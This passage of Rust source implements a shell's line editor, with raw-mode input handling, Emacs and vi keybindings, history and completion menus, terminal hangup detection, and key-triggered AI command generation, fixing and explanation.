/// Line editor: raw mode, cursor movement, inline editing, integration with
/// highlighting, suggestions, and completion. Supports multiline editing.
use crate::ai::{
    AiConfig, AiContext, AiRequest, AiRequestKind, AiResponse, AiSubmitError, AiWorker,
};
use crate::completer::{self, common_prefix, Completion, CompletionKind};
use crate::environment::ShellState;
use crate::highlighter;
use crate::history::History;
use crate::prompt;
use crate::signal::{SIGHUP_RECEIVED, SIGINT_RECEIVED, SIGWINCH_RECEIVED};
use crate::suggest;
use crate::workflows;

use nix::libc;

use crossterm::{
    cursor::{self, MoveToColumn, MoveUp},
    event::{self, Event, KeyCode, KeyEvent, KeyModifiers},
    style::{
        Attribute, Color, Print, ResetColor, SetAttribute, SetBackgroundColor, SetForegroundColor,
    },
    terminal::{self, Clear, ClearType},
    ExecutableCommand, QueueableCommand,
};
use std::io::{self, stdout, Write};
use std::sync::atomic::Ordering;
use std::time::Duration;
use unicode_width::UnicodeWidthChar;

const MAX_AI_EXECUTION_OUTPUT_BYTES: usize = 32 * 1024;
const MAX_AI_GIT_STATUS_PROBE_BYTES: usize = 4 * 1024;
const AI_OUTPUT_TRUNCATION_MARKER: &str = "\n... [terminal output truncated for AI context] ...\n";

#[derive(Debug, Clone, PartialEq)]
enum ViMode {
    Normal,
    Insert,
}

pub struct Editor {
    buffer: String,
    cursor: usize, // byte position in buffer
    saved_buffer: String,
    suggestion: Option<String>,
    terminal_width: u16,
    terminal_height: u16,
    completion_menu: Option<CompletionMenu>,
    search_mode: Option<SearchMode>,
    workflow_mode: Option<WorkflowMode>,
    last_rendered_lines: u16,
    last_cursor_row: u16,
    vi_mode: ViMode,
    vi_pending: Option<char>,
    ai_worker: Option<AiWorker>,
    ai_include_extended_context: bool,
    ai_request_sequence: u64,
    active_ai_request: Option<ActiveAiRequest>,
    ai_saved_input: Option<AiInputSnapshot>,
    ai_explanation: Option<String>,
    ai_error: Option<String>,
    pub last_error_info: Option<(String, String, i32)>,
    pub last_error_execution_id: Option<String>,
    pub key_bindings: crate::keybindings::KeyBindingManager,
    cached_prompt: String,
    last_buffer_snapshot: String,
    last_cursor_snapshot: usize,
    last_suggestion_snapshot: Option<String>,
    last_menu_snapshot: Option<usize>,
    last_ai_explanation_snapshot: Option<String>,
    last_ai_error_snapshot: Option<String>,
    /// Byte stolen from the kernel input queue by `swallow_enter_tail` that
    /// turned out not to be part of a CR+LF Enter; replayed as typed input at
    /// the next `read_line`.
    pushback_byte: Option<u8>,
}

#[derive(Clone)]
struct AiInputSnapshot {
    buffer: String,
    cursor: usize,
    suggestion: Option<String>,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
struct ActiveAiRequest {
    request_id: u64,
    kind: AiRequestKind,
}

#[derive(Clone)]
struct WorkflowInputSnapshot {
    buffer: String,
    cursor: usize,
    suggestion: Option<String>,
}

struct WorkflowMode {
    query: String,
    results: Vec<workflows::Workflow>,
    selected: usize,
    original_input: WorkflowInputSnapshot,
    session: Option<workflows::WorkflowSession>,
    suggestion_selected: Option<usize>,
}

struct CompletionMenu {
    completions: Vec<Completion>,
    selected: usize,
    word_start: usize,
    original_word: String,
}

struct SearchMode {
    query: String,
    results: Vec<(String, Vec<usize>)>,
    rich_results: Vec<(String, Vec<usize>, u64, Option<String>)>,
    selected: usize,
}

impl Default for Editor {
    fn default() -> Self {
        Self::new()
    }
}

impl Editor {
    pub fn new() -> Self {
        let (w, h) = terminal::size().unwrap_or((80, 24));
        let ai_config = AiConfig::from_env();
        let ai_include_extended_context = ai_config
            .as_ref()
            .is_some_and(AiConfig::allows_extended_context);
        let ai_worker = ai_config.map(AiWorker::new);
        Editor {
            buffer: String::new(),
            cursor: 0,
            saved_buffer: String::new(),
            suggestion: None,
            terminal_width: w,
            terminal_height: h,
            completion_menu: None,
            search_mode: None,
            workflow_mode: None,
            last_rendered_lines: 0,
            last_cursor_row: 0,
            vi_mode: ViMode::Insert,
            vi_pending: None,
            ai_worker,
            ai_include_extended_context,
            ai_request_sequence: 0,
            active_ai_request: None,
            ai_saved_input: None,
            ai_explanation: None,
            ai_error: None,
            last_error_info: None,
            last_error_execution_id: None,
            key_bindings: crate::keybindings::KeyBindingManager::new(
                crate::keybindings::EditorMode::Emacs,
            ),
            cached_prompt: String::new(),
            last_buffer_snapshot: String::new(),
            last_cursor_snapshot: 0,
            last_suggestion_snapshot: None,
            last_menu_snapshot: None,
            last_ai_explanation_snapshot: None,
            last_ai_error_snapshot: None,
            pushback_byte: None,
        }
    }

    pub fn read_line(
        &mut self,
        state: &mut ShellState,
        history: &mut History,
    ) -> io::Result<Option<String>> {
        // A new shell prompt is a hard generation boundary. Replies from the
        // previous prompt may still arrive, but can no longer mutate this one.
        self.invalidate_ai_request(false);
        self.buffer.clear();
        self.cursor = 0;
        self.suggestion = None;
        self.saved_buffer.clear();
        self.completion_menu = None;
        self.search_mode = None;
        self.workflow_mode = None;
        self.ai_explanation = None;
        self.ai_error = None;
        self.vi_mode = ViMode::Insert;
        self.vi_pending = None;
        history.reset_position();

        self.take_editor_prefill(state);

        // Replay a byte stolen by swallow_enter_tail as if it had just been
        // typed. Non-printable stolen bytes are dropped: they cannot be
        // rendered into the line buffer meaningfully.
        if let Some(b) = self.pushback_byte.take() {
            if (0x20..0x7f).contains(&b) {
                self.buffer.push(b as char);
                self.cursor = self.buffer.len();
            }
        }

        // OSC 133;A — prompt start marker (semantic shell integration)
        if state.interactive {
            crate::osc::prompt_start();
        }

        // The width may have changed since the last prompt — or since the
        // editor was constructed: a terminal that spawns the shell first and
        // sizes its view afterwards (the jterm block terminals do) leaves the
        // construction-time size stale.
        self.refresh_terminal_size();

        self.cached_prompt = prompt::render_prompt(state);
        // Visual rows, not hard newlines: an info line wider than the
        // terminal soft-wraps, and the first repaint must know how far up
        // the prompt really starts.
        let prompt_rows = rows_consumed(&self.cached_prompt, self.terminal_width);
        self.last_rendered_lines = prompt_rows;
        self.last_cursor_row = prompt_rows;
        print!("{}", self.cached_prompt);
        io::stdout().flush()?;

        // OSC 133;B — prompt end / command input start marker
        if state.interactive {
            crate::osc::command_start();
        }

        terminal::enable_raw_mode()?;
        stdout().execute(event::EnableBracketedPaste).ok();
        let result = self.edit_loop(state, history);
        // Submit, Ctrl-C, EOF and terminal hangup all leave through this seam.
        // Invalidate before the next prompt can observe a late worker reply.
        self.invalidate_ai_request(false);
        if let Ok(Some(line)) = &result {
            self.swallow_enter_tail(!line.is_empty());
        }
        stdout().execute(event::DisableBracketedPaste).ok();
        terminal::disable_raw_mode()?;

        result
    }

    /// A terminal in newline mode (DECSET 20 LNM — set and abandoned by an
    /// interrupted full-screen app) or an IME Enter commit delivers Enter as
    /// CR+LF, sometimes split across two writes. The edit loop submits on the
    /// CR alone; a trailing LF still in the kernel input queue would then be
    /// read by the next process to touch stdin — enough for a script's
    /// `read -p "Proceed? [Y/n]"` to silently auto-accept. Consume exactly one
    /// immediately-following LF/CR here, while the terminal is still in raw
    /// mode. A stolen byte that is not a line terminator cannot be pushed back
    /// into the kernel queue, so it is stashed and replayed at the next prompt.
    /// `wait` extends the probe by a few milliseconds to catch a split write;
    /// empty submissions use a zero-timeout probe so Enter-spam stays instant.
    fn swallow_enter_tail(&mut self, wait: bool) {
        let window_ms = if wait { 20 } else { 0 };
        if !matches!(Self::poll_stdin(window_ms), StdinPoll::Ready) {
            return;
        }
        let mut b = [0u8; 1];
        let n = unsafe { libc::read(libc::STDIN_FILENO, b.as_mut_ptr() as *mut libc::c_void, 1) };
        if n == 1 && b[0] != b'\n' && b[0] != b'\r' {
            self.pushback_byte = Some(b[0]);
        }
    }

    fn edit_loop(
        &mut self,
        state: &mut ShellState,
        history: &mut History,
    ) -> io::Result<Option<String>> {
        // Compute initial suggestion for proactive recommendations on empty buffer
        // (e.g., suggest "git push" right after "git commit")
        self.update_suggestion(history, state);
        // A status set before the first keystroke — a refused agent prefill is
        // the one that leaves the buffer empty — has to be painted here or it
        // is never seen: the next key press clears it.
        if self.suggestion.is_some() || !self.buffer.is_empty() || self.ai_error.is_some() {
            self.repaint(state)?;
        }

        let mut consecutive_timeouts: u32 = 0;

        loop {
            if SIGHUP_RECEIVED.load(Ordering::SeqCst) {
                return Ok(None);
            }
            if SIGINT_RECEIVED.swap(false, Ordering::SeqCst) {
                self.buffer.clear();
                self.cursor = 0;
                print!("^C\r\n");
                return Ok(Some(String::new()));
            }
            // A stale width mis-counts soft wraps, and every repaint then
            // leaves stale prompt rows behind. SIGWINCH delivery is not to
            // be trusted for this — the shell and crossterm each install a
            // handler and whichever registers last wins — so the size is
            // re-read at every wakeup rather than only when a flag fires.
            if self.refresh_terminal_size() {
                self.repaint(state)?;
            }

            // Check if terminal is dead more frequently to avoid CPU spin on deleted ptys
            if Self::is_terminal_dead() {
                return Ok(None);
            }

            // Drain every event crossterm has already parsed. crossterm reads ahead:
            // one read() pulls all pending bytes into its own buffer, so we must empty
            // that buffer here instead of assuming the kernel fd still has data. Each
            // crossterm call is guarded by an explicit hangup check, because crossterm's
            // event::poll/read uses an edge-triggered epoll and spins at 100% CPU on a
            // closed pty (read() returns EOF forever, never EAGAIN). We must never let it
            // touch the fd once the master is gone.
            loop {
                if matches!(Self::poll_stdin(0), StdinPoll::Hangup) {
                    return Ok(None);
                }
                if !event::poll(Duration::from_millis(0))? {
                    break;
                }
                consecutive_timeouts = 0;
                match event::read()? {
                    Event::Key(key) => {
                        // Input is also cancellation. Generate/fix temporarily
                        // replace the line with a progress marker; restore the
                        // request snapshot before applying this key so a reply
                        // from the same request cannot overwrite text entered
                        // while it was in flight. Explain keeps the line in
                        // place, but editing still makes its response stale.
                        let cancelled_ai = self.cancel_ai_for_user_input();
                        let cancelling_workflow =
                            self.workflow_mode.is_some() && key.code == KeyCode::Esc;
                        // Enter while a generated/fixed command is pending is
                        // cancellation, not permission to submit the progress
                        // marker or immediately enqueue the same request again.
                        if matches!(
                            cancelled_ai,
                            Some(AiRequestKind::Generate | AiRequestKind::Fix)
                        ) && key.code == KeyCode::Enter
                        {
                            self.ai_error = None;
                            self.ai_explanation = None;
                            self.update_suggestion(history, state);
                            self.repaint(state)?;
                            continue;
                        }
                        // AI failures are rendered as a transient status line. Any
                        // subsequent key dismisses it while leaving the restored
                        // command buffer intact.
                        self.ai_error = None;
                        self.ai_explanation = None;
                        // Typing with the menu open narrows it rather than
                        // closing it: the list was opened *because* the word
                        // was ambiguous, and the natural way to resolve that
                        // is to keep typing. Arrows and Tab move within it;
                        // anything else ends it.
                        let narrowing = matches!(key.code, KeyCode::Char(_) | KeyCode::Backspace)
                            && !key.modifiers.contains(KeyModifiers::CONTROL)
                            && !key.modifiers.contains(KeyModifiers::ALT);
                        // Narrowing consumes the keystroke: the character
                        // is already on the line, and letting the normal
                        // insert path run would type it twice.
                        if narrowing && self.completion_menu.is_some() {
                            self.narrow_completion_menu(key.code);
                            self.update_suggestion(history, state);
                            self.repaint(state)?;
                            continue;
                        }
                        if !matches!(
                            key.code,
                            KeyCode::Tab
                                | KeyCode::BackTab
                                | KeyCode::Enter
                                | KeyCode::Up
                                | KeyCode::Down
                        ) {
                            if let Some(menu) = self.completion_menu.take() {
                                if key.code == KeyCode::Esc {
                                    self.buffer.replace_range(
                                        menu.word_start..self.cursor,
                                        &menu.original_word,
                                    );
                                    self.cursor = menu.word_start + menu.original_word.len();
                                }
                            }
                        }

                        match self.handle_key(key, state, history)? {
                            KeyAction::Continue => {}
                            KeyAction::Submit => {
                                self.suggestion = None;
                                self.repaint_for_submit(state)?;
                                print!("\r\n");
                                let line = self.buffer.clone();
                                return Ok(Some(line));
                            }
                            KeyAction::Eof => {
                                if self.buffer.is_empty() {
                                    self.suggestion = None;
                                    self.repaint_for_submit(state)?;
                                    print!("\r\n");
                                    return Ok(None);
                                } else {
                                    self.delete_char();
                                }
                            }
                            KeyAction::Interrupt => {
                                print!("^C\r\n");
                                return Ok(Some(String::new()));
                            }
                        }

                        // Workflow cancellation restores the exact suggestion
                        // snapshot (including an AI ghost that history cannot
                        // reconstruct), so do not immediately overwrite it.
                        if !cancelling_workflow {
                            self.update_suggestion(history, state);
                        }
                        self.repaint(state)?;
                    }
                    Event::Paste(text) => {
                        self.cancel_ai_for_user_input();
                        self.ai_error = None;
                        self.ai_explanation = None;
                        if self.workflow_mode.is_some() {
                            self.handle_workflow_paste(&text, state);
                        } else if text.chars().all(|ch| {
                            ch == '\n' || !crate::terminal_text::is_terminal_ambiguous(ch)
                        }) {
                            self.buffer.insert_str(self.cursor, &text);
                            self.cursor += text.len();
                        } else {
                            self.ai_error = Some(
                                "Paste rejected: invisible or terminal-control text".to_string(),
                            );
                        }
                        self.update_suggestion(history, state);
                        self.repaint(state)?;
                    }
                    Event::Resize(w, h) => {
                        self.terminal_width = w;
                        self.terminal_height = h;
                        self.repaint(state)?;
                    }
                    _ => {}
                }
            }

            // Nothing buffered. Wait for new input (or a hangup) on the raw fd. Doing
            // the wait ourselves means a pty hangup that happens mid-wait is reported
            // as POLLHUP and we exit cleanly, instead of crossterm's poll spinning.
            match Self::poll_stdin(100) {
                StdinPoll::Hangup => return Ok(None),
                StdinPoll::Ready => {} // loop; the drain above will read it
                StdinPoll::Timeout => {
                    consecutive_timeouts = consecutive_timeouts.saturating_add(1);
                    // Drain even when no request is active: cancelled requests
                    // can finish late, and leaving one queued would block the
                    // single-flight worker from delivering the current reply.
                    if self.drain_ai_responses() {
                        self.repaint(state)?;
                    }
                }
            }
        }
    }

    /// Wait up to `timeout_ms` for stdin to become readable, distinguishing a real
    /// hangup (pty master closed) from ordinary input. isatty() keeps returning true
    /// after the master closes (the slave fd is still a tty), so POLLHUP is the only
    /// reliable signal that the terminal went away.
    fn poll_stdin(timeout_ms: i32) -> StdinPoll {
        let mut pfd = libc::pollfd {
            fd: libc::STDIN_FILENO,
            events: libc::POLLIN,
            revents: 0,
        };
        let r = unsafe { libc::poll(&mut pfd, 1, timeout_ms) };
        if r <= 0 {
            // r < 0: interrupted (EINTR) or error; r == 0: timed out. Either way the
            // caller re-checks its flags and waits again.
            return StdinPoll::Timeout;
        }
        if pfd.revents & (libc::POLLHUP | libc::POLLERR | libc::POLLNVAL) != 0 {
            return StdinPoll::Hangup;
        }
        if pfd.revents & libc::POLLIN != 0 {
            return StdinPoll::Ready;
        }
        StdinPoll::Timeout
    }

    fn handle_key(
        &mut self,
        key: KeyEvent,
        state: &mut ShellState,
        history: &mut History,
    ) -> io::Result<KeyAction> {
        if self.workflow_mode.is_some() {
            return self.handle_workflow_key(key, state);
        }
        if self.search_mode.is_some() {
            return self.handle_search_key(key, history);
        }
        if matches!(
            (key.code, key.modifiers),
            (KeyCode::Char('g'), KeyModifiers::CONTROL)
        ) {
            self.open_workflow(state);
            return Ok(KeyAction::Continue);
        }

        match state.editing_mode {
            crate::environment::EditingMode::Vi => self.handle_vi_key(key, state, history),
            crate::environment::EditingMode::Emacs => self.handle_emacs_key(key, state, history),
        }
    }

    fn handle_emacs_key(
        &mut self,
        key: KeyEvent,
        state: &mut ShellState,
        history: &mut History,
    ) -> io::Result<KeyAction> {
        match (key.code, key.modifiers) {
            (KeyCode::Enter, _) => {
                // Accept completion if menu is open
                if let Some(menu) = self.completion_menu.take() {
                    let completion = &menu.completions[menu.selected];
                    let text = completion.text.clone();
                    let is_dir = completion.is_dir;
                    self.record_accepted_completion(menu.word_start, &text, state);
                    self.buffer
                        .replace_range(menu.word_start..self.cursor, &text);
                    self.cursor = menu.word_start + text.len();
                    if !is_dir {
                        self.buffer.insert(self.cursor, ' ');
                        self.cursor += 1;
                    }
                    return Ok(KeyAction::Continue);
                }
                // AI natural language: "# describe what you want" → generate command.
                // With AI disabled this remains an ordinary shell comment and is
                // submitted normally.
                if let Some(prompt_text) = self.ai_generation_prompt().map(str::to_string) {
                    if self.trigger_ai_generate(&prompt_text, state, history) {
                        return Ok(KeyAction::Continue);
                    }
                    // A trigger that failed with a reportable reason must not
                    // fall through to submitting the text as an ordinary shell
                    // comment: the next prompt clears the message before the
                    // user could read it, which is the "keypress did nothing"
                    // symptom itself.
                    if self.ai_error.is_some() {
                        return Ok(KeyAction::Continue);
                    }
                }
                // Check if input is incomplete (multiline)
                if crate::parser::is_incomplete(&self.buffer) {
                    self.buffer.push('\n');
                    self.cursor = self.buffer.len();
                    // Auto-indent based on nesting depth
                    let indent = compute_indent(&self.buffer);
                    let indent_str = "    ".repeat(indent);
                    self.buffer.push_str(&indent_str);
                    self.cursor = self.buffer.len();
                    return Ok(KeyAction::Continue);
                }
                // Clear suggestion before submitting to avoid ghost text on screen
                self.suggestion = None;
                return Ok(KeyAction::Submit);
            }
            (KeyCode::Char('d'), KeyModifiers::CONTROL) => {
                return Ok(KeyAction::Eof);
            }
            (KeyCode::Char('c'), KeyModifiers::CONTROL) => {
                return Ok(KeyAction::Interrupt);
            }
            (KeyCode::Char('l'), KeyModifiers::CONTROL) => {
                let mut out = stdout();
                out.execute(Clear(ClearType::All))?;
                out.execute(cursor::MoveTo(0, 0))?;
                self.last_rendered_lines = 0;
                self.last_cursor_row = 0;
            }
            (KeyCode::Char('a'), KeyModifiers::CONTROL) => {
                self.cursor = self.last_line_start();
            }
            (KeyCode::Char('e'), KeyModifiers::CONTROL) => {
                // End of current line (not buffer)
                self.cursor = self.current_line_end();
            }
            (KeyCode::Char('k'), KeyModifiers::CONTROL) => {
                let end = self.current_line_end();
                self.buffer.drain(self.cursor..end);
            }
            (KeyCode::Char('u'), KeyModifiers::CONTROL) => {
                let start = self.last_line_start();
                self.buffer.drain(start..self.cursor);
                self.cursor = start;
            }
            (KeyCode::Char('w'), KeyModifiers::CONTROL) => {
                let new_pos = self.prev_word_boundary();
                self.buffer.drain(new_pos..self.cursor);
                self.cursor = new_pos;
            }
            (KeyCode::Char('r'), KeyModifiers::CONTROL) => {
                self.search_mode = Some(SearchMode {
                    query: String::new(),
                    results: Vec::new(),
                    rich_results: Vec::new(),
                    selected: 0,
                });
            }
            (KeyCode::Char('f'), KeyModifiers::CONTROL) => {
                // AI fix: suggest corrected command based on last error
                self.trigger_ai_fix(state, history);
            }
            (KeyCode::Char('e'), KeyModifiers::ALT) => {
                // AI explain: explain the current buffer command
                if !self.buffer.is_empty() {
                    self.trigger_ai_explain(state, history);
                }
            }
            (KeyCode::Tab, _) => {
                self.handle_tab(state);
            }
            (KeyCode::BackTab, _) => {
                self.step_completion_menu(-1);
            }
            // Take one word of the ghost rather than all of it. A suggestion
            // is often right at the start and wrong at the end — the command
            // and its subcommand, then a path from another directory — and
            // this is how you keep the part that fits.
            (KeyCode::Right, KeyModifiers::CONTROL) | (KeyCode::Char('f'), KeyModifiers::ALT)
                if self.cursor >= self.buffer.len() && self.suggestion.is_some() =>
            {
                self.accept_suggestion_word();
            }
            (KeyCode::Right, KeyModifiers::NONE) => {
                if self.cursor >= self.buffer.len() {
                    if let Some(suggestion) = self.suggestion.take() {
                        self.buffer.push_str(&suggestion);
                        self.cursor = self.buffer.len();
                    }
                } else {
                    self.move_right();
                }
            }
            (KeyCode::Left, KeyModifiers::NONE) => {
                self.move_left();
            }
            (KeyCode::Home, _) => {
                self.cursor = self.last_line_start();
            }
            (KeyCode::End, _) => {
                self.cursor = self.current_line_end();
            }
            // While the completion menu is open the arrows belong to it.
            // Walking away into history would discard a menu the person is
            // still reading, and there is no way back to it.
            (KeyCode::Up, _) if self.completion_menu.is_some() => {
                self.step_completion_menu(-1);
            }
            (KeyCode::Down, _) if self.completion_menu.is_some() => {
                self.step_completion_menu(1);
            }
            (KeyCode::Up, _) => {
                // Multiline: move cursor up within buffer if not on first line
                let before_cursor = &self.buffer[..self.cursor];
                if before_cursor.contains('\n') {
                    self.move_cursor_up();
                } else {
                    // First line — navigate history
                    if self.cursor == self.buffer.len() && self.saved_buffer.is_empty() {
                        self.saved_buffer = self.buffer.clone();
                    }
                    if let Some(entry) = history.prev() {
                        self.buffer = entry.to_string();
                        self.cursor = self.buffer.len();
                    }
                }
            }
            (KeyCode::Down, _) => {
                // Multiline: move cursor down within buffer if not on last line
                let after_cursor = &self.buffer[self.cursor..];
                if after_cursor.contains('\n') {
                    self.move_cursor_down();
                } else {
                    match history.next() {
                        Some(entry) => {
                            self.buffer = entry.to_string();
                            self.cursor = self.buffer.len();
                        }
                        None => {
                            self.buffer = std::mem::take(&mut self.saved_buffer);
                            self.cursor = self.buffer.len();
                        }
                    }
                }
            }
            (KeyCode::Backspace, _) => {
                if self.cursor > 0 {
                    let prev = self.prev_char_boundary();
                    self.buffer.drain(prev..self.cursor);
                    self.cursor = prev;
                }
            }
            (KeyCode::Delete, _) => {
                self.delete_char();
            }
            (KeyCode::Right, KeyModifiers::ALT) | (KeyCode::Right, KeyModifiers::CONTROL) => {
                // Accept one word from ghost text suggestion (fish-style partial accept)
                if self.cursor >= self.buffer.len() {
                    if let Some(ref suggestion) = self.suggestion {
                        let word_end = find_next_word_boundary(suggestion);
                        let word = suggestion[..word_end].to_string();
                        let rest = suggestion[word_end..].to_string();
                        self.buffer.push_str(&word);
                        self.cursor = self.buffer.len();
                        if rest.is_empty() {
                            self.suggestion = None;
                        } else {
                            self.suggestion = Some(rest);
                        }
                    }
                } else {
                    // Move cursor forward by one word when not at end
                    let new_pos = self.next_word_boundary();
                    self.cursor = new_pos;
                }
            }
            (KeyCode::Left, KeyModifiers::ALT) | (KeyCode::Left, KeyModifiers::CONTROL) => {
                // Move cursor backward by one word
                let new_pos = self.prev_word_boundary();
                self.cursor = new_pos;
            }
            (KeyCode::Char(c), KeyModifiers::NONE | KeyModifiers::SHIFT)
                if !crate::terminal_text::is_terminal_ambiguous(c) =>
            {
                self.buffer.insert(self.cursor, c);
                self.cursor += c.len_utf8();
            }
            _ => {}
        }

        Ok(KeyAction::Continue)
    }

    fn handle_vi_key(
        &mut self,
        key: KeyEvent,
        state: &mut ShellState,
        history: &mut History,
    ) -> io::Result<KeyAction> {
        match self.vi_mode {
            ViMode::Insert => self.handle_vi_insert_key(key, state, history),
            ViMode::Normal => self.handle_vi_normal_key(key, state, history),
        }
    }

    fn handle_vi_insert_key(
        &mut self,
        key: KeyEvent,
        state: &mut ShellState,
        history: &mut History,
    ) -> io::Result<KeyAction> {
        match (key.code, key.modifiers) {
            (KeyCode::Esc, _) => {
                self.vi_mode = ViMode::Normal;
                // Move cursor back one if possible (vi behavior)
                if self.cursor > 0 {
                    self.move_left();
                }
                // Set block cursor
                print!("\x1b[1 q");
            }
            // In insert mode, most keys behave like Emacs mode
            _ => return self.handle_emacs_key(key, state, history),
        }
        Ok(KeyAction::Continue)
    }

    fn handle_vi_normal_key(
        &mut self,
        key: KeyEvent,
        state: &mut ShellState,
        history: &mut History,
    ) -> io::Result<KeyAction> {
        // Handle pending multi-char commands (dd, dw, etc.)
        if let Some(pending) = self.vi_pending.take() {
            return self.handle_vi_pending(pending, key);
        }

        match (key.code, key.modifiers) {
            // Mode switching
            (KeyCode::Char('i'), KeyModifiers::NONE) => {
                self.vi_mode = ViMode::Insert;
                print!("\x1b[5 q"); // line cursor
            }
            (KeyCode::Char('a'), KeyModifiers::NONE) => {
                self.vi_mode = ViMode::Insert;
                self.move_right();
                print!("\x1b[5 q");
            }
            (KeyCode::Char('A'), KeyModifiers::SHIFT) => {
                self.vi_mode = ViMode::Insert;
                self.cursor = self.current_line_end();
                print!("\x1b[5 q");
            }
            (KeyCode::Char('I'), KeyModifiers::SHIFT) => {
                self.vi_mode = ViMode::Insert;
                self.cursor = self.last_line_start();
                print!("\x1b[5 q");
            }
            (KeyCode::Char('o'), KeyModifiers::NONE) => {
                self.vi_mode = ViMode::Insert;
                self.cursor = self.current_line_end();
                self.buffer.insert(self.cursor, '\n');
                self.cursor += 1;
                print!("\x1b[5 q");
            }
            (KeyCode::Char('O'), KeyModifiers::SHIFT) => {
                self.vi_mode = ViMode::Insert;
                let start = self.last_line_start();
                self.buffer.insert(start, '\n');
                self.cursor = start;
                print!("\x1b[5 q");
            }

            // Movement
            (KeyCode::Char('h'), KeyModifiers::NONE) | (KeyCode::Left, _) => {
                self.move_left();
            }
            (KeyCode::Char('l'), KeyModifiers::NONE) | (KeyCode::Right, _) => {
                if self.cursor < self.buffer.len() {
                    self.move_right();
                }
            }
            (KeyCode::Char('j'), KeyModifiers::NONE) | (KeyCode::Down, _) => {
                let after_cursor = &self.buffer[self.cursor..];
                if after_cursor.contains('\n') {
                    self.move_cursor_down();
                } else {
                    match history.next() {
                        Some(entry) => {
                            self.buffer = entry.to_string();
                            self.cursor = self.buffer.len();
                        }
                        None => {
                            self.buffer = std::mem::take(&mut self.saved_buffer);
                            self.cursor = self.buffer.len();
                        }
                    }
                }
            }
            (KeyCode::Char('k'), KeyModifiers::NONE) | (KeyCode::Up, _) => {
                let before_cursor = &self.buffer[..self.cursor];
                if before_cursor.contains('\n') {
                    self.move_cursor_up();
                } else {
                    if self.cursor == self.buffer.len() && self.saved_buffer.is_empty() {
                        self.saved_buffer = self.buffer.clone();
                    }
                    if let Some(entry) = history.prev() {
                        self.buffer = entry.to_string();
                        self.cursor = self.buffer.len();
                    }
                }
            }
            (KeyCode::Char('0'), KeyModifiers::NONE) => {
                self.cursor = self.last_line_start();
            }
            (KeyCode::Char('$'), KeyModifiers::SHIFT) | (KeyCode::End, _) => {
                self.cursor = self.current_line_end();
                // In normal mode, cursor sits ON the last char, not past it
                let end = self.current_line_end();
                if end > self.last_line_start() {
                    self.cursor = self.prev_char_boundary_from(end);
                }
            }
            (KeyCode::Char('^'), KeyModifiers::SHIFT) | (KeyCode::Home, _) => {
                // Go to first non-whitespace char
                let start = self.last_line_start();
                let end = self.current_line_end();
                let line = &self.buffer[start..end];
                let indent = line.len() - line.trim_start().len();
                self.cursor = start + indent;
            }

            // Word movement
            (KeyCode::Char('w'), KeyModifiers::NONE) => {
                self.vi_word_forward();
            }
            (KeyCode::Char('b'), KeyModifiers::NONE) => {
                self.vi_word_backward();
            }
            (KeyCode::Char('e'), KeyModifiers::NONE) => {
                self.vi_word_end();
            }

            // Editing
            (KeyCode::Char('x'), KeyModifiers::NONE) => {
                self.delete_char();
            }
            (KeyCode::Char('X'), KeyModifiers::SHIFT) => {
                if self.cursor > 0 {
                    let prev = self.prev_char_boundary();
                    self.buffer.drain(prev..self.cursor);
                    self.cursor = prev;
                }
            }
            (KeyCode::Char('d'), KeyModifiers::NONE) => {
                self.vi_pending = Some('d');
            }
            (KeyCode::Char('c'), KeyModifiers::NONE) => {
                self.vi_pending = Some('c');
            }
            (KeyCode::Char('C'), KeyModifiers::SHIFT) => {
                // Change to end of line
                let end = self.current_line_end();
                self.buffer.drain(self.cursor..end);
                self.vi_mode = ViMode::Insert;
                print!("\x1b[5 q");
            }
            (KeyCode::Char('D'), KeyModifiers::SHIFT) => {
                // Delete to end of line
                let end = self.current_line_end();
                self.buffer.drain(self.cursor..end);
            }
            (KeyCode::Char('s'), KeyModifiers::NONE) => {
                // Substitute char
                self.delete_char();
                self.vi_mode = ViMode::Insert;
                print!("\x1b[5 q");
            }
            (KeyCode::Char('S'), KeyModifiers::SHIFT) => {
                // Substitute line
                let start = self.last_line_start();
                let end = self.current_line_end();
                self.buffer.drain(start..end);
                self.cursor = start;
                self.vi_mode = ViMode::Insert;
                print!("\x1b[5 q");
            }
            (KeyCode::Char('r'), KeyModifiers::NONE) => {
                self.vi_pending = Some('r');
            }
            (KeyCode::Char('p'), KeyModifiers::NONE) => {
                // Paste - not implemented (no clipboard)
            }

            // Search
            (KeyCode::Char('/'), KeyModifiers::NONE) => {
                self.search_mode = Some(SearchMode {
                    query: String::new(),
                    results: Vec::new(),
                    rich_results: Vec::new(),
                    selected: 0,
                });
            }

            // Enter submits in normal mode
            (KeyCode::Enter, _) => {
                // Accept completion if menu open
                if let Some(menu) = self.completion_menu.take() {
                    let completion = &menu.completions[menu.selected];
                    let text = completion.text.clone();
                    let is_dir = completion.is_dir;
                    self.record_accepted_completion(menu.word_start, &text, state);
                    self.buffer
                        .replace_range(menu.word_start..self.cursor, &text);
                    self.cursor = menu.word_start + text.len();
                    if !is_dir {
                        self.buffer.insert(self.cursor, ' ');
                        self.cursor += 1;
                    }
                    return Ok(KeyAction::Continue);
                }
                if crate::parser::is_incomplete(&self.buffer) {
                    self.buffer.push('\n');
                    self.cursor = self.buffer.len();
                    let indent = compute_indent(&self.buffer);
                    let indent_str = "    ".repeat(indent);
                    self.buffer.push_str(&indent_str);
                    self.cursor = self.buffer.len();
                    return Ok(KeyAction::Continue);
                }
                // Clear suggestion before submitting to avoid ghost text on screen
                self.suggestion = None;
                return Ok(KeyAction::Submit);
            }

            // Ctrl+C interrupt
            (KeyCode::Char('c'), KeyModifiers::CONTROL) => {
                return Ok(KeyAction::Interrupt);
            }
            (KeyCode::Char('d'), KeyModifiers::CONTROL) => {
                return Ok(KeyAction::Eof);
            }
            (KeyCode::Char('l'), KeyModifiers::CONTROL) => {
                let mut out = stdout();
                out.execute(Clear(ClearType::All))?;
                out.execute(cursor::MoveTo(0, 0))?;
                self.last_rendered_lines = 0;
                self.last_cursor_row = 0;
            }

            _ => {}
        }
        Ok(KeyAction::Continue)
    }

    fn handle_vi_pending(&mut self, pending: char, key: KeyEvent) -> io::Result<KeyAction> {
        match pending {
            'd' => {
                match key.code {
                    KeyCode::Char('d') => {
                        // dd: delete entire line
                        let start = self.last_line_start();
                        let end = self.current_line_end();
                        // Also delete the newline if there is one
                        if end < self.buffer.len() && self.buffer.as_bytes()[end] == b'\n' {
                            self.buffer.drain(start..end + 1);
                            self.cursor = start.min(self.buffer.len().saturating_sub(1));
                        } else if start > 0 {
                            // Delete preceding newline instead
                            let new_start = start - 1;
                            self.buffer.drain(new_start..end);
                            self.cursor = new_start.min(self.buffer.len());
                        } else {
                            self.buffer.drain(start..end);
